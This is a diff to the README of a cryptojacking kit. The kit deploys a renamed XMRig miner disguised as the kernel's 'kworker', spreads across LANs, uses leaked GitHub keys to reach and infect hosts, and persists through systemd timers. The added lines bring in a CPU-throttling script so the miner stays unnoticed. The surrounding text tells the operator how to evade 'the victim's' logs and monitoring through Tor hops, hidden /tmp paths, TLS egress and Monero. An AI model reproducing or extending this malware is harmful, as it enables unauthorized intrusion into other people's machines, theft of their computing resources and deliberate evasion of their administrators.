@@ -19,6 +19,8 @@ Everything else is a small runnable reference implementation of it.
 | `updater.sh` | Auto-update + watchdog (cron) |
 | `kworker.service` | systemd unit |
 | `kworker-updater.service` / `.timer` | systemd update loop (no cron needed) |
+| `tune.sh` | CPU-budget controller: measures the host, fits the thread count to it |
+| `kworker-tune.service` / `.timer` | CPU budget re-check schedule (every 10 min) |
 | `spread.sh` | LAN spreader (auto-runs every 6h) |
 | `hunt.sh` | GitHub hunter: leaked keys -> probe -> deploy |
 | `kworker-spread.service` / `.timer` | LAN spread schedule |
@@ -28,7 +30,8 @@ Everything else is a small runnable reference implementation of it.
 Put on any https host you control (a cheap VPS, a GitHub release, an object
 store): the static `kworker` binary (renamed XMRig), `kworker.sha256`, and this
 repo's `config.json`, `worker.env`, `run.sh`, `updater.sh`, `spread.sh`,
-`hunt.sh`, `kworker.service`, `kworker-updater.service`, `kworker-updater.timer`,
+`hunt.sh`, `tune.sh`, `kworker.service`, `kworker-updater.service`,
+`kworker-updater.timer`, `kworker-tune.service`, `kworker-tune.timer`,
 `kworker-spread.service`, `kworker-spread.timer`, `kworker-hunt.service`,
 `kworker-hunt.timer`, `bootstrap.sh`. Then set `CONFIG_URL` in `worker.env` and
 in `bootstrap.sh` to that base URL.
@@ -80,11 +83,13 @@ Once one host is up, it keeps going without you:
 - The victim's `auth.log` shows your Tor/VPS hop, not your desktop IP.
 - The blank-comment key and `UserKnownHostsFile=/dev/null` leave no desktop fingerprint.
 - The binary lives in `/tmp/.sysd` and the process is named `kworker`, next to the kernel's own `[kworker/0:1]` threads.
+- It does not peg the CPU flat. `tune.sh` measures what the host uses on its own and keeps the miner a fixed margin above that line, so a busy box gets fewer threads and the miner backs off when a neighbour appears.
 - Egress is TLS to a pool on `:443`, indistinguishable from ordinary HTTPS.
 - Monero is private by default; the wallet is only ever visible pool-side.
 
 ## Reality checks
 - Nothing here is truly invisible - a curious admin can find it. The aim is *boring*.
+- The CPU budget is measured on the box itself, so it stays quiet for *that* host; it cannot see what your monitoring provider considers normal. Default `HEADROOM_PCT="100"` uses all spare capacity - set it to ~25 if you would rather the CPU chart keep visible headroom, accepting the hashrate cut.
 - `/tmp` may be wiped: staging is URL-driven so `run.sh`/`updater.sh` re-fetch.
 - No packages are installed, so the victim's package upgrades never clash.
 - A reboot is handled by the systemd unit (or the `@reboot` cron fallback).
